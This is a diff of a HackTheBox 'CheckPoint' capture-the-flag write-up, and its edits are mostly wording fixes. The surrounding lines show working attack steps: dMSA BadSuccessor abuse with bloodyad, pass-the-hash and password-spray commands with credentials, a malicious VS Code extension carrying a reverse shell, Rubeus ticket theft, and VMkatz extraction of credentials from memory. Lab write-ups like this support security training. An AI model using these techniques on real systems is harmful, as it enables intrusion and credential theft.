@@ -3,6 +3,8 @@ title: "CheckPoint"
 date: 2026-10-27 00:00:00 +08000
 categories: [HTB, Write-ups]
 tags: [HTB, Medium, Write-up, Windows, ActiveDirectory, dMSA, VSCode Package, MemoryForensics]
+image:
+  path: /assets/img/writeups/checkpoint/checkpoint.png
 description: "A medium Windows HackTheBox machine involving Active Directory object recovery via Deleted Objects restoration, privilege escalation through dMSA BetterSuccessor abuse, lateral movement by weaponizing a malicious VS Code .vsix extension, and domain compromise through credential extraction from a VM memory snapshot."
 ---
 
@@ -293,7 +295,7 @@ I couldn't crack that using hashcat (:{) .
 
 #### What about dMSA?
 
-If you skipped the [dMSA](#dmsa) part, now is a good time to read it.
+If you skipped the [dMSA](#dmsa) part, now is a good time for you to go back and read it.
 
 At this point I kept starring at this output for a while, when I remembered [eightenn](https://app.hackthebox.com/machines/Eighteen) another great machine from HTB where I abused the dMSA - BadSuccessor. I saw that `CREATE_CHILD` over the OU `OU=Employees,DC=checkpoint,DC=htb`, and thought, why not? 
 
@@ -322,7 +324,7 @@ distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC
 permission: CREATE_CHILD
 ```
 
-bloodyad BadSuccessor module automates the process: it creates a new dMSA account (`hacker$`) and sets `msDS-ManagedAccountPrecededByLink` (and `msDS-GroupMSAMembership`) to point at Mark Davies DN, marking `hacker$` as the successor of Mark Davies’ account. At this point, the dMSA object exists and is linked. The only thing left is getting a ticket, which is where bloodyad attempt to auto fetch a dMSA TGT failed on encryption type negotiation.
+bloodyad BadSuccessor module automates the process: it creates a new dMSA account (`hacker$`) and sets `msDS-ManagedAccountPrecededByLink` (and `msDS-GroupMSAMembership`) to point at Mark Davies DN, marking `hacker$` as the successor of Mark Davies’ account. At this point, the dMSA object exists and is linked. The only thing left is getting a ticket, which is where bloodyad attempts to auto fetch a dMSA TGT failed on encryption type negotiation.
 
 ```bash
 $ bloodyad -H dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' add badSuccessor hacker -t "CN=MARK DAVIES,OU=EMPLOYEES,DC=CHECKPOINT,DC=HTB"
@@ -341,7 +343,7 @@ Traceback (most recent call last):
 kerbad.protocol.errors.KerberosError:  Error Name: KDC_ERR_ETYPE_NOTSUPP Detail: "KDC has no support for encryption type"
 ```
 
-Because `msDS-GroupMSAMembership` on hacker$ authorizes `alex.turner` to act on its behalf, he can perform the S4U2self dMSA key-retrieval exchange. Now  I can:
+Because `msDS-GroupMSAMembership` on hacker$ authorizes `alex.turner` to act on its behalf, he can perform the S4U2self dMSA key-retrieval exchange. Now I'm able to:
 
 1. Get a TGT as `alex.turner`
 2. Use that TGT to request an S4U2self ticket to impersonate `hacker$`
@@ -370,7 +372,7 @@ SMB         10.129.187.153  445    DC01             [*] Windows 11 / Server 2025
 SMB         10.129.187.153  445    DC01             [+] checkpoint.htb\hacker$:7f669d33b962f788a753ee25142f7e67
 ```
 
-The **Previous keys** (the RC4 hash) are literally Mark Davies’ old NT hash, because hacker$ was created as his “successor.” Since dMSA migration preserves the predecessor’s credential material, the dMSA ticket exchange leaks it.
+The **Previous keys** (the RC4 hash) are literally Mark Davies’s old NT hash, because hacker$ was created as his successor. Since dMSA migration preserves the predecessor’s credential material, the dMSA ticket exchange leaks it.
 
 ```bash
 $ nxc smb checkpoint.htb -u mark.davies -H 0b28e49d9deb96f99d74578e214faec2
@@ -380,7 +382,7 @@ SMB         10.129.187.153  445    DC01             [+] checkpoint.htb\mark.davi
 
 #### Password Reuse, DUHH
 
-After finishing the machine, when I discussed how was I got access to `mark.davies` with a fiend, he told me, bro, just do a password spray :}}}}}}}}}}}}
+After I had finished the machine, I discussed how I got access to `mark.davies` with a friend, he told me, bro, just do a password spray :}}}}}}}}}}}}
 
 ```bash
 $ nxc smb checkpoint.htb -u ./users.list -p Checkpoint2024! --continue-on-success | grep +
@@ -426,9 +428,9 @@ SMB         10.129.187.153  445    DC01             SYSVOL          READ        
 SMB         10.129.187.153  445    DC01             VMBackups
 ```
 
-I went through [extension anatomy](https://code.visualstudio.com/api/get-started/extension-anatomy), [activation events](https://code.visualstudio.com/api/references/activation-events), [vscode-vsce](https://github.com/microsoft/vscode-vsce) and some AI :}, to create a malicious VS code extension.
+I used these resources, [extension anatomy](https://code.visualstudio.com/api/get-started/extension-anatomy), [activation events](https://code.visualstudio.com/api/references/activation-events), and [vscode-vsce](https://github.com/microsoft/vscode-vsce), besides little tweaks from AI, to create a malicious VS code extension.
 
-Creating the following structure
+Creating the following structure:
 
 ```bash
 $ tree evil-ext
@@ -437,7 +439,7 @@ evil-ext
 └── package.json
 ```
 
-The manifest pins engines VSCode to `^1.118.0` to match the compatibility constraint advertised on the `DevDrop` share, so the extension doesn’t get filtered out by whatever install/approval process consumes it.
+The following manifest pins engines VSCode to `^1.118.0` to match the compatibility constraint advertised on the `DevDrop` share, so the extension doesn’t get filtered out by whatever install/approval process consumes it.
 
 `activationEvents: ["onStartupFinished"]` will start up automatically as soon as VS Code finishes loading.
 
@@ -455,7 +457,7 @@ The manifest pins engines VSCode to `^1.118.0` to match the compatibility constr
 }
 ```
 
-The main JS extension file which has the reverse shell:
+The main JS extension file which has the reverse shell payload in the `active()` function:
 
 ```js
 const {
@@ -478,7 +480,7 @@ module.exports = {
 };
 ```
 
-crafting the extension using `vsce`:
+Crafting the extension using `vsce`:
 
 ```bash
 $ tree evil-ext
@@ -513,7 +515,7 @@ evil-ext
 └── package.json
 ```
 
-Upload it, create a listener and wait for the reverse shell.
+Start a listener, upload it, then wait for the reverse shell.
 
 ```bash
 $ smbclient.py checkpoint.htb/'hacker$'@dc01.checkpoint.htb -k -no-pass
@@ -521,7 +523,7 @@ $ smbclient.py checkpoint.htb/'hacker$'@dc01.checkpoint.htb -k -no-pass
 # put evil-ext/checkpoint-utils-1.0.0.vsix
 ```
 
-Catching a reverse shell:
+Catching a reverse shell as `ryan.brooks`:
 
 ```bash
 $ rlwrap nc -lvnp 2222
@@ -535,7 +537,7 @@ PS C:\Program Files\Microsoft VS Code> type C:\Users\ryan.brooks\Desktop\user.tx
 5067a8****
 ```
 
-Get the TGT from `ryan.brooks` session after transferring Rubeus. 
+Get the TGT from `ryan.brooks` session using Rubeus. 
 
 ```bash
 PS C:\Program Files\Microsoft VS Code> cd C:\Users\ryan.brooks\Documents
@@ -578,7 +580,7 @@ PS C:\Users\ryan.brooks\Documents> .\Rubeus.exe tgtdeleg /nowrap
 PS C:\Users\ryan.brooks\Documents>
 ```
 
-Taking the base64 blob to my Linux machine, convert it to a ccache file for further usage.
+Took the base64 blob to my Linux machine, converted it to a ccache file for further usage.
 
 ```bash
 $ echo "doIF1DC...." | base64 -d > ryan.brooks.kirbi
@@ -592,7 +594,9 @@ Impacket v0.14.0.dev0+20261015.95810.75938fcb - Copyright Fortra, LLC and its af
 
 ## dMSA - AGAIN
 
-Using Ryan's TGT to list what he can write in the domain, we can glance the same artifacts we saw above when we abused dMSA to get access over Mark Davies. This time, Ryan has WRITE permissions over `svc_deploy` and `CREATE_CHILD` over the OU `distinguishedName: OU=DMSAHolder,DC=checkpoint,DC=htb`.
+Using Ryan's TGT to list what privileges he has over other objects in the domain, we can glance the same artifacts we saw above when we abused dMSA to get access over Mark Davies.
+
+This time, Ryan has WRITE permissions over `svc_deploy` and `CREATE_CHILD` over the OU `distinguishedName: OU=DMSAHolder,DC=checkpoint,DC=htb`.
 
 ```bash
 $ bloodyad -H dc01.checkpoint.htb -d checkpoint.htb -u ryan.brooks -k get writable                                                   
@@ -665,7 +669,9 @@ This time bloodyad auto fetching a dMSA TGT successfully worked on encryption ty
 
 ## VMBackups
 
-Listing the DC shares using `svc_deploy` account, we can see that this account has read permissions over the VMBackups share.
+Also this time we have two options, to either work with the `hacker2$` TGT resulted from bloodyad above, or continue with `svc_deploy` NT hash which I chose to continue with.
+
+Listing the DC shares using `svc_deploy` account, we can see that this account has READ permissions over the VMBackups share.
 
 ```bash
 $ nxc smb checkpoint.htb -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9 --shares
@@ -682,7 +688,6 @@ SMB         10.129.187.153   445    DC01             NETLOGON        READ       
 SMB         10.129.187.153   445    DC01             SYSVOL          READ            Logon server share
 SMB         10.129.187.153   445    DC01             VMBackups       READ
 ```
-
 
 ```bash
 $ smbclient.py checkpoint.htb/'svc_deploy'@dc01.checkpoint.htb -hashes :e16081eb077aca74bdbf8af12af43ac9
@@ -711,11 +716,11 @@ drw-rw-rw-          0  Wed May 13 16:58:18 2026 ..
 -rw-rw-rw-        274  Wed May 13 16:58:18 2026 Windows Server 2019.vmxf
 ```
 
-`.vmem` file (raw RAM dump) and a `.vmsn` (snapshot state). This is  a live memory capture of a Windows server, we can loot LSASS secrets, cached credentials, and potentially plaintext material out of the memory image.
+`.vmem` (raw RAM dump) and a `.vmsn` (snapshot state) files indicate a live memory capture of a Windows server, which allows us to loot LSASS secrets, cached credentials and other artifacts out of the memory image.
 
 ### VMKatz
 
-We can use a memory forensics tool such volatility, BUT, two months before the machine release, I saw and saved this great [post](https://lnkd.in/p/eXpaEYaN) in Linked from [Nicolas Devillers](https://www.linkedin.com/in/nicolasdevillers/), releasing a tool called [VMkatz](https://github.com/nikaiw/VMkatz) that extracts Windows credentials directly from VM snapshots.
+We can use a memory forensics tool such volatility, BUT two months before the machine has been released, I've noticed and saved this great [post](https://lnkd.in/p/eXpaEYaN) in LinkedIn from [Nicolas Devillers](https://www.linkedin.com/in/nicolasdevillers/), releasing a tool called [VMkatz](https://github.com/nikaiw/VMkatz) that extracts Windows credentials directly from VM snapshots.
 
 ```powershell
 $ evil-winrm -i dc01.checkpoint.htb -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9
@@ -793,7 +798,9 @@ vmkatz.exe : [*] vmkatz v1.4.1
 *Evil-WinRM* PS C:\ProgramData> exit
 ```
 
-We can see that the VM has 2 logon sessions, one for the machine account and the other for the Administrator, Validating the extracted Administrator NT Hash and getting the root flag :}.
+We can see that the VM had 2 logon sessions, for both administrator, and machine account.
+
+Validating the extracted Administrator NT Hash and getting the root flag :}.
 
 ```bash
 $ nxc smb checkpoint.htb -u Administrator -H f29e9c014295b9b32139b09a2790be3b
@@ -833,6 +840,4 @@ Mode                 LastWriteTime         Length Name
 *Evil-WinRM* PS C:\Users\max.palmer\Desktop> cat root.txt
 4c7af1c8****
 ```
-
-GG.
-
+GG, well played :D.
